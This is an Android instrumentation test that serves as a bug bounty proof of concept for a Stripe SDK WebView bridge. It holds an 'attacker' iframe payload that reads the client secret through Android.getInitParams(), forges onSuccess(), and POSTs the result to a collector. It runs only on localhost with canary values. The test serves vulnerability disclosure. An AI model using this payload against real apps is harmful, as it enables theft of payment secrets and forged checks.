package com.stripe.android.challenge.confirmation

import android.net.Uri
import android.security.NetworkSecurityPolicy
import android.webkit.ConsoleMessage
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.test.core.app.ActivityScenario
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import com.google.common.truth.Truth.assertThat
import com.google.common.truth.Truth.assertWithMessage
import com.stripe.android.TestActivity
import com.stripe.android.core.ApiConfiguration
import com.stripe.android.core.Logger
import com.stripe.android.testing.FakeErrorReporter
import com.stripe.android.testing.PaymentIntentFactory
import java.io.Closeable
import java.net.InetAddress
import java.net.ServerSocket
import java.util.Collections
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import org.junit.After
import org.junit.Test
import org.junit.runner.RunWith

/**
 * Real-WebView PoC (bug bounty report /reports/4119714):
 * the production `Android` JavaScript interface registered by
 * [IntentConfirmationChallengeWebView] is reachable from JavaScript running
 * in a CROSS-ORIGIN iframe loaded inside the WebView, with no origin
 * validation anywhere in the component, and it hands that frame:
 *   - the PaymentIntent/SetupIntent client secret + publishable key
 *     via getInitParams()
 *   - the ability to forge a completed-challenge result via onSuccess()
 *
 * Setup on a real Android emulator WebView:
 *   - origin A (parent page): 127.0.0.1:<portA>
 *   - origin B (attacker frame): 127.0.0.1:<portB>  (different port => origin)
 *   - the iframe's OWN JavaScript calls Android.getInitParams() and
 *     Android.onSuccess(...) and POSTs the result to origin B's collector.
 *
 * No code in this test calls the bridge methods directly - only the
 * iframe's JavaScript does, on a real WebView.
 *
 * Pinned analysis commit: 363bcfa890de14fcd2cf8358bd414fdb67ace2f3
 */
@RunWith(AndroidJUnit4::class)
internal class IntentConfirmationChallengeRealWebViewPoCTest {

    private val canaryPublishableKey = "pk_test_canary_PUBLISHABLE_KEY"
    private val canaryClientSecret = "pi_canary_SECRET_do_not_use"
    private val forgedClientSecret = "pi_REAL_FORGED_secret_from_iframe"

    private val instrumentation = InstrumentationRegistry.getInstrumentation()

    private lateinit var parentServer: MiniServer
    private lateinit var frameServer: MiniServer
    private val frameCollector = BodyCollector()
    private val mainCollector = BodyCollector()
    private val openedUris = Collections.synchronizedList(mutableListOf<Uri>())
    private val consoleMessages = Collections.synchronizedList(mutableListOf<String>())
    private val pageEvents = Collections.synchronizedList(mutableListOf<String>())

    private fun createHandler(): DefaultConfirmationChallengeBridgeHandler {
        val args = IntentConfirmationChallengeArgs(
            apiConfiguration = ApiConfiguration.State(canaryPublishableKey, "acct_canary"),
            intent = PaymentIntentFactory.create(clientSecret = canaryClientSecret),
            productUsage = listOf("PaymentSheet"),
            captchaVendorName = "hcaptcha",
        )
        return DefaultConfirmationChallengeBridgeHandler(
            successParamsParser = BridgeSuccessParamsJsonParser(),
            errorParamsParser = BridgeErrorParamsJsonParser(),
            args = args,
            errorReporter = FakeErrorReporter(),
        )
    }

    @After
    fun tearDown() {
        runCatching { parentServer.close() }
        runCatching { frameServer.close() }
    }

    @Test
    fun crossOriginIframeJavaScriptReceivesClientSecretAndForgesSuccess() {
        frameServer = MiniServer("B") { method, path, body ->
            when {
                method == "POST" && path == "/collect-frame" -> {
                    frameCollector.add(body.orEmpty())
                    200 to "{}"
                }
                method == "GET" && path == "/frame.html" -> 200 to buildFrameHtml()
                else -> 404 to "not found"
            }
        }
        parentServer = MiniServer("A") { method, path, body ->
            when {
                method == "POST" && path == "/collect-main" -> {
                    mainCollector.add(body.orEmpty())
                    200 to "{}"
                }
                method == "GET" -> 200 to buildParentHtml(frameServer.port)
                else -> 404 to "not found"
            }
        }

        val parentUrl = "http://127.0.0.1:${parentServer.port}/"
        val handler = createHandler()
        val cleartextAllowed = NetworkSecurityPolicy.getInstance().isCleartextTrafficPermitted()

        ActivityScenario.launch(TestActivity::class.java).use { scenario ->
            var webView: WebView? = null

            scenario.onActivity { activity ->
                val wv = IntentConfirmationChallengeWebView(activity)
                webView = wv
                wv.addBridgeHandler(handler)

                // Production WebViewClient, wrapped only to observe page lifecycle
                // and errors for diagnostics; all navigation decisions still go
                // through the production implementation.
                val productionClient = IntentConfirmationWebViewClient(
                    hostUrl = parentUrl,
                    errorHandler = {},
                    logger = Logger.getInstance(enableLogging = false),
                    openUri = { uri -> openedUris.add(uri) },
                )
                wv.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean =
                        productionClient.shouldOverrideUrlLoading(view, request)

                    override fun onPageFinished(view: WebView?, url: String?) {
                        pageEvents.add("finished: $url")
                    }

                    override fun onReceivedError(
                        view: WebView?,
                        request: WebResourceRequest?,
                        error: WebResourceError?,
                    ) {
                        pageEvents.add(
                            "error: ${request?.url} -> ${error?.errorCode} ${error?.description}",
                        )
                        productionClient.onReceivedError(view, request, error)
                    }

                    override fun onReceivedHttpError(
                        view: WebView?,
                        request: WebResourceRequest?,
                        errorResponse: WebResourceResponse?,
                    ) {
                        pageEvents.add(
                            "httpError: ${request?.url} -> ${errorResponse?.statusCode}",
                        )
                        productionClient.onReceivedHttpError(view, request, errorResponse)
                    }
                }
                wv.webChromeClient = object : WebChromeClient() {
                    override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                        consoleMessages.add(
                            "${consoleMessage?.messageLevel()}: ${consoleMessage?.message()}",
                        )
                        return false
                    }
                }
                activity.setContentView(wv)
                wv.loadUrl(parentUrl)
            }

            val frameBodies = frameCollector.awaitAll(1, timeoutSeconds = 45)
            val mainBodies = mainCollector.awaitAll(1, timeoutSeconds = 5)
            val finalUrl = runOnUiThread { webView?.url }

            val diagnostics = buildString {
                append("cleartextAllowed=").append(cleartextAllowed)
                append(" | parentServer=127.0.0.1:").append(parentServer.port)
                append(", hits=").append(parentServer.requestLog())
                append(" | frameServer=127.0.0.1:").append(frameServer.port)
                append(", hits=").append(frameServer.requestLog())
                append(" | pageEvents=").append(pageEvents)
                append(" | console=").append(consoleMessages)
                append(" | openedUris=").append(openedUris)
                append(" | webView.url=").append(finalUrl)
                append(" | mainBodies=").append(mainBodies)
                append(" | frameBodies=").append(frameBodies)
            }
            println("[PoC-DIAG] $diagnostics")

            assertWithMessage("iframe collector empty - full diagnostics: $diagnostics")
                .that(frameBodies)
                .isNotEmpty()

            val frameReport = JSONObject(frameBodies.first())
            val origin = frameReport.getString("origin")

            // 1. Genuinely a different origin than the parent page.
            assertThat(origin).isEqualTo("http://127.0.0.1:${frameServer.port}")
            assertThat(frameServer.port).isNotEqualTo(parentServer.port)

            // 2. The `Android` bridge is reachable from that cross-origin frame's JS.
            assertThat(frameReport.getBoolean("hasAndroid")).isTrue()

            // 3. The frame received the publishable key + live client secret.
            val initParams = JSONObject(frameReport.getString("initParams"))
            assertThat(initParams.getString("publishableKey")).isEqualTo(canaryPublishableKey)
            assertThat(initParams.getString("clientSecret")).isEqualTo(canaryClientSecret)

            // 4. The same frame forged a completed-challenge result through onSuccess().
            assertThat(frameReport.getBoolean("forgedSuccessSent")).isTrue()
            val successEvent = runBlocking {
                withTimeout(30_000) {
                    handler.event.first { it is ConfirmationChallengeBridgeEvent.Success }
                }
            } as ConfirmationChallengeBridgeEvent.Success
            assertThat(successEvent.clientSecret).isEqualTo(forgedClientSecret)

            // 5. Control: the MAIN frame also has the interface.
            assertThat(mainBodies).isNotEmpty()
            val mainReport = JSONObject(mainBodies.first())
            assertThat(mainReport.getBoolean("hasAndroid")).isTrue()

            // 6. No main-frame navigation was kicked out to an external browser;
            //    the iframe content reached the bridge with zero navigation.
            assertThat(openedUris).isEmpty()

            println("[PoC] PASS: cross-origin iframe JS read the client secret and forged onSuccess")
        }
    }

    private fun <T> runOnUiThread(block: () -> T): T {
        var result: T? = null
        instrumentation.runOnMainSync { result = block() }
        @Suppress("UNCHECKED_CAST")
        return result as T
    }

    private fun buildParentHtml(framePort: Int): String = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>parent origin A</title></head>
        <body>
        <script>
          fetch('/collect-main', {method: 'POST', body: JSON.stringify({
            frame: 'main',
            origin: location.origin,
            hasAndroid: typeof Android !== 'undefined'
          })}).catch(function (e) { console.log('main fetch failed: ' + e); });
        </script>
        <iframe src="http://127.0.0.1:$framePort/frame.html" width="320" height="240"></iframe>
        </body></html>
    """.trimIndent()

    private fun buildFrameHtml(): String = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>attacker origin B</title></head>
        <body><script>
        (async function () {
          const out = {
            frame: 'iframe',
            origin: location.origin,
            hasAndroid: typeof Android !== 'undefined'
          };
          try {
            if (out.hasAndroid) {
              out.initParams = Android.getInitParams();
              Android.onSuccess(JSON.stringify({client_secret: "$forgedClientSecret"}));
              out.forgedSuccessSent = true;
            }
          } catch (e) {
            out.error = String(e);
          }
          try {
            await fetch('/collect-frame', {method: 'POST', body: JSON.stringify(out)});
          } catch (e) {
            console.log('iframe collect failed: ' + e);
          }
        })();
        </script></body></html>
    """.trimIndent()

    private class BodyCollector {
        private val bodies = Collections.synchronizedList(mutableListOf<String>())
        private val latch = CountDownLatch(1)

        fun add(body: String) {
            bodies.add(body)
            latch.countDown()
        }

        fun awaitAll(minCount: Int, timeoutSeconds: Long): List<String> {
            if (bodies.size < minCount) {
                latch.await(timeoutSeconds, TimeUnit.SECONDS)
            }
            val deadline = System.currentTimeMillis() + 1_000
            while (bodies.size < minCount && System.currentTimeMillis() < deadline) {
                Thread.sleep(50)
            }
            return bodies.toList()
        }
    }

    private class MiniServer(
        private val name: String,
        private val handler: (method: String, path: String, body: String?) -> Pair<Int, String>,
    ) : Closeable {
        private val socket = ServerSocket(0, 50, InetAddress.getByName("127.0.0.1"))
        val port: Int get() = socket.localPort
        private val log = Collections.synchronizedList(mutableListOf<String>())

        fun requestLog(): List<String> = synchronized(log) { log.toList() }

        private val thread = Thread {
            while (!socket.isClosed) {
                runCatching {
                    socket.accept().use { client ->
                        // Read the request manually from the raw stream: a
                        // BufferedReader would swallow the POST body into its
                        // buffer, deadlocking body reads on the raw stream.
                        val raw = client.getInputStream()
                        val requestLine = readLine(raw) ?: return@use
                        val parts = requestLine.split(" ")
                        val method = parts.getOrElse(0) { "GET" }
                        val path = parts.getOrNull(1)?.substringBefore("?") ?: "/"
                        log.add("$name $method $path")
                        var contentLength = 0
                        while (true) {
                            val line = readLine(raw) ?: break
                            if (line.isEmpty()) break
                            if (line.startsWith("Content-Length:", ignoreCase = true)) {
                                contentLength = line.substringAfter(":").trim().toIntOrNull() ?: 0
                            }
                        }
                        val body = if (contentLength > 0) {
                            val bytes = ByteArray(contentLength)
                            var read = 0
                            while (read < contentLength) {
                                val n = raw.read(bytes, read, contentLength - read)
                                if (n < 0) break
                                read += n
                            }
                            String(bytes, 0, read, Charsets.UTF_8)
                        } else {
                            null
                        }
                        val (code, payload) = handler(method, path, body)
                        val payloadBytes = payload.toByteArray(Charsets.UTF_8)
                        val status = if (code == 200) "OK" else "Not Found"
                        val header = (
                            "HTTP/1.1 $code $status\r\n" +
                                "Content-Type: text/html; charset=utf-8\r\n" +
                                "Content-Length: ${payloadBytes.size}\r\n" +
                                "Connection: close\r\n\r\n"
                            ).toByteArray(Charsets.UTF_8)
                        client.getOutputStream().write(header)
                        client.getOutputStream().write(payloadBytes)
                        client.getOutputStream().flush()
                    }
                }
            }
        }.apply {
            isDaemon = true
            start()
        }

        private fun readLine(raw: java.io.InputStream): String? {
            val sb = StringBuilder()
            while (true) {
                val b = raw.read()
                if (b == -1) return if (sb.isEmpty()) null else sb.toString()
                if (b == '\n'.code) break
                if (b != '\r'.code) sb.append(b.toChar())
            }
            return sb.toString()
        }

        override fun close() {
            runCatching { socket.close() }
        }
    }
}
